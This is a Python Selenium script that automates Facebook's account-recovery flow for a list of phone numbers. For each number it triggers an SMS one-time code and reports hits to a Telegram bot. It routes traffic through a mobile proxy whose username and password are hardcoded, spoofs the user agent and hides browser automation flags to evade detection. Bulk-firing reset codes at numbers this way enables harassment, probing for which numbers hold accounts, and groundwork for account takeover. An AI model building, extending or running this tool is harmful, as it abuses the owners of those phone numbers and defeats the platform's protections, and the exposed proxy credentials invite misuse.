"""
Facebook OTP Local Automation (Windows) - NO VPN VERSION
=========================================================
Simple OTP automation without VPN automation.
Connect to VPN manually using ProtonVPN app, then run this script.

Usage: python fb_otp_simple.py <phone_number_or_file> [--visible]
"""

import sys
import os
import time
import re
import io
from datetime import datetime

print("[DEBUG] fb_otp_simple.py initialization started...", flush=True)

try:
    import requests
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import TimeoutException, NoSuchElementException
    print("[DEBUG] Essential libraries imported successfully.", flush=True)
except ImportError as e:
    print(f"[ERROR] Missing dependency: {e}", flush=True)
    print("Please run: pip install -r requirements.txt", flush=True)
    sys.exit(1)

try:
    from webdriver_manager.chrome import ChromeDriverManager
    print("[DEBUG] webdriver_manager imported.", flush=True)
except ImportError:
    ChromeDriverManager = None
    print("[DEBUG] webdriver_manager not found, using system chromedriver.", flush=True)

# Fix console encoding
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

# Colors
class C:
    B = '\033[94m'
    G = '\033[92m'
    Y = '\033[93m'
    R = '\033[91m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def log(msg, level="INFO"):
    t = datetime.now().strftime("%H:%M:%S")
    colors = {"INFO": C.B, "OK": C.G, "WARN": C.Y, "ERROR": C.R, "SUCCESS": C.G + C.BOLD}
    c = colors.get(level, "")
    print(f"{C.CYAN}[{t}]{C.END} {c}[{level}] {msg}{C.END}", flush=True)

def get_current_ip():
    """Check current public IP without proxy"""
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        return response.text.strip()
    except:
        return "Unknown"

def get_proxy_ip():
    """Check IP via Bright Data proxy"""
    try:
        proxies = {
            "http": "http://brd-customer-hl_90769934-zone-mobile_proxy1:p43u4hlvc8xi@brd.superproxy.io:33335",
            "https": "http://brd-customer-hl_90769934-zone-mobile_proxy1:p43u4hlvc8xi@brd.superproxy.io:33335"
        }
        response = requests.get('https://api.ipify.org', proxies=proxies, timeout=15, verify=False)
        return response.text.strip()
    except Exception as e:
        return f"Error: {e}"

class FacebookOTPBrowser:
    def __init__(self, headless=False):
        self.driver = None
        self.headless = headless
        self.wait_time = 15
        self.current_phone = None
        self.telegram_token = os.environ.get("TELEGRAM_TOKEN")
        self.telegram_chat_id = os.environ.get("TELEGRAM_CHAT_ID")
        
        # Bright Data Proxy Configuration
        self.proxy_host = "brd.superproxy.io"
        self.proxy_port = "33335"
        self.proxy_user = "brd-customer-hl_90769934-zone-mobile_proxy1"
        self.proxy_pass = "p43u4hlvc8xi"

    def _create_proxy_extension(self):
        """Create Chrome extension for proxy authentication"""
        import zipfile
        
        manifest_json = """
        {
            "version": "1.0.0",
            "manifest_version": 2,
            "name": "Chrome Proxy",
            "permissions": [
                "proxy",
                "tabs",
                "unlimitedStorage",
                "storage",
                "<all_urls>",
                "webRequest",
                "webRequestBlocking"
            ],
            "background": {
                "scripts": ["background.js"]
            },
            "minimum_chrome_version":"22.0.0"
        }
        """

        background_js = """
        var config = {
                mode: "fixed_servers",
                rules: {
                singleProxy: {
                    scheme: "http",
                    host: "%s",
                    port: parseInt(%s)
                },
                bypassList: ["localhost"]
                }
            };

        chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

        function callbackFn(details) {
            return {
                authCredentials: {
                    username: "%s",
                    password: "%s"
                }
            };
        }

        chrome.webRequest.onAuthRequired.addListener(
                    callbackFn,
                    {urls: ["<all_urls>"]},
                    ['blocking']
        );
        """ % (self.proxy_host, self.proxy_port, self.proxy_user, self.proxy_pass)

        pluginfile = 'proxy_auth_plugin.zip'
        with zipfile.ZipFile(pluginfile, 'w') as zp:
            zp.writestr("manifest.json", manifest_json)
            zp.writestr("background.js", background_js)
        
        return pluginfile

    def _setup_driver(self):
        log("Setting up Chrome browser with Bright Data proxy...")
        options = Options()
        
        # Create proxy extension for authentication
        proxy_extension = self._create_proxy_extension()
        options.add_extension(proxy_extension)
        log(f"Proxy configured: {self.proxy_host}:{self.proxy_port}", "OK")
        
        # Note: Can't use headless mode with extensions
        if self.headless:
            log("WARNING: Headless mode disabled (proxy extension requires visible browser)", "WARN")
        
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
        options.add_argument("--window-size=1366,768")
        options.add_argument("--start-maximized")
        options.add_argument("--disable-notifications")
        options.add_argument("--lang=en-US")
        
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)

        try:
            if ChromeDriverManager:
                service = Service(ChromeDriverManager().install())
                self.driver = webdriver.Chrome(service=service, options=options)
            else:
                self.driver = webdriver.Chrome(options=options)
            
            self.driver.set_page_load_timeout(30)
            self.wait = WebDriverWait(self.driver, 10)
            
            self.driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                "source": "Object.defineProperty(navigator, 'webdriver', { get: () => undefined });"
            })
            
            return True
        except Exception as e:
            log(f"Failed to setup Chrome: {e}", "ERROR")
            return False

    def send_telegram_photo(self, caption, file_path):
        if not self.telegram_token or not self.telegram_chat_id:
            return
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendPhoto"
            with open(file_path, "rb") as f:
                files = {"photo": f}
                data = {"chat_id": self.telegram_chat_id, "caption": caption}
                response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                log("Telegram notification sent!", "OK")
            else:
                log(f"Failed to send Telegram: {response.text}", "WARN")
        except Exception as e:
            log(f"Error sending Telegram: {e}", "WARN")

    def _handle_cookie_consent(self):
        try:
            js_click = """
            (function() {
                let spans = [...document.querySelectorAll('span')];
                let target = spans.find(s => s.innerText === 'Allow all cookies' || s.innerText.includes('السماح'));
                if (target) { target.click(); return true; }
                return false;
            })();
            """
            if self.driver.execute_script(js_click):
                log("Cookie consent accepted", "OK")
                time.sleep(1)
        except: pass

    def run_flow(self, phone):
        self.current_phone = phone
        log(f"Starting OTP flow for {phone}")
        
        if not self._setup_driver():
            return False

        try:
            # 1. Open Identify Page
            self.driver.get('https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0')
            time.sleep(2)
            self._handle_cookie_consent()

            # 2. Enter Phone
            try:
                inp = self.wait.until(EC.presence_of_element_located((By.ID, "identify_email")))
                inp.clear()
                inp.send_keys(phone)
                inp.send_keys(Keys.ENTER)
                log("Phone entered and searched", "INFO")
                time.sleep(3)
            except:
                log("Could not find phone input field", "ERROR")
                return False

            # 3. Handle Results
            url = self.driver.current_url
            page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()

            if "no search results" in page_text or "لم يتم العثور" in page_text:
                log("Account not found for this number", "WARN")
                return False

            if "recover" not in url and "reset" not in url:
                try:
                    btn = self.driver.find_element(By.LINK_TEXT, "Try another way")
                    btn.click()
                    time.sleep(2)
                except:
                    log("Stuck on non-recovery page", "WARN")

            # 4. Select SMS and Send
            try:
                radios = self.driver.find_elements(By.CSS_SELECTOR, "input[type='radio']")
                sms_found = False
                for r in radios:
                    if "sms" in r.get_attribute("outerHTML").lower():
                        self.driver.execute_script("arguments[0].click();", r)
                        sms_found = True
                        break
                
                if sms_found:
                    log("SMS option selected", "OK")
                    btn = self.driver.find_element(By.NAME, "reset_action")
                    btn.click()
                    time.sleep(3)
                    
                    # 5. Verify Success
                    if "recover/code" in self.driver.current_url or "enter code" in self.driver.page_source.lower():
                        log("🎉 SUCCESS: OTP SENT!", "SUCCESS")
                        screenshot_path = f"success_{phone}.png"
                        self.driver.save_screenshot(screenshot_path)
                        self.send_telegram_photo(f"✅ OTP SENT!\nPhone: {phone}\nStatus: Success", screenshot_path)
                        os.remove(screenshot_path)
                        return True
                    else:
                        log("Failed to verify if code was sent", "WARN")
                else:
                    log("SMS option not found in list", "WARN")
            except Exception as e:
                log(f"Error during SMS selection: {e}", "ERROR")

        except Exception as e:
            log(f"Flow Error: {e}", "ERROR")
        finally:
            if self.driver:
                self.driver.quit()
        
        return False

def format_phone(phone):
    return re.sub(r'[^\d+]', '', phone).strip()

def main():
    if len(sys.argv) < 2:
        print("Usage: python fb_otp_simple.py <phone_number_or_file> [--visible]")
        return

    target = sys.argv[1]
    headless = "--visible" not in sys.argv
    
    # Show current IP
    current_ip = get_current_ip()
    log(f"Your IP (without proxy): {current_ip}")
    
    # Test proxy connection
    log("Testing Bright Data proxy connection...")
    proxy_ip = get_proxy_ip()
    log(f"Proxy IP (Bright Data Mobile): {proxy_ip}", "OK")
    log("=" * 50)
    log("Using Bright Data Mobile Proxy - $8/GB")
    log("=" * 50)
    
    # Get numbers
    numbers = []
    if os.path.isfile(target):
        with open(target, 'r') as f:
            numbers = [format_phone(line) for line in f if line.strip()]
    else:
        numbers = [format_phone(target)]

    if not numbers:
        log("No valid numbers provided", "ERROR")
        return

    log(f"Total numbers to process: {len(numbers)}")
    
    success_count = 0
    fail_count = 0
    
    for i, phone in enumerate(numbers):
        log(f"\n{'='*40}")
        log(f" PROCESSING: {phone} ({i+1}/{len(numbers)})")
        log(f"{'='*40}")

        bot = FacebookOTPBrowser(headless=headless)
        if bot.run_flow(phone):
            success_count += 1
        else:
            fail_count += 1
        
        # Small delay between numbers
        if i < len(numbers) - 1:
            log("Waiting 3 seconds before next number...")
            time.sleep(3)
    
    log(f"\n{'='*50}")
    log(f"COMPLETED: {success_count} success, {fail_count} failed")
    log(f"{'='*50}")

if __name__ == "__main__":
    main()
